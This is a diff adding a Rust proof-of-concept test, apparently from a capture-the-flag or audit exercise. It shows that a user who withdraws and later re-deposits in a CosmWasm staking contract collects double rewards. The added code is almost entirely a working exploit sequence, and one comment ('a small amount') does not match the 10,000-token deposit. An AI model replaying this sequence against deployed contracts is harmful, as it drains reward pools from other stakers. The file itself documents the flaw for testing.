@@ -410,4 +410,106 @@ pub mod tests {
         assert_eq!(user_info.staked_amount, Uint128::zero());
         assert_eq!(user_info.pending_rewards, Uint128::zero());
     }
+
+    #[test]
+    fn test_exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // user1 withdraws the full amount
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        assert_eq!(user_info.pending_rewards, Uint128::new(10000));
+
+        // new user2 join
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // owner increases reward
+        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(OWNER),
+            contract_addr.clone(),
+            &ExecuteMsg::IncreaseReward {},
+            &[coin(10_000, REWARD_DENOM)],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        assert_eq!(user_info.pending_rewards, Uint128::new(10000));
+
+        // User deposits a small amount after the reward increase, without staking
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(1));
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000u128, DENOM)],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        assert_eq!(user_info.pending_rewards, Uint128::new(20000));
+
+        // User claims rewards
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+
+        // Check user's balance
+        let balance = app
+            .wrap()
+            .query_balance(USER.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::new(20000));
+    }
 }
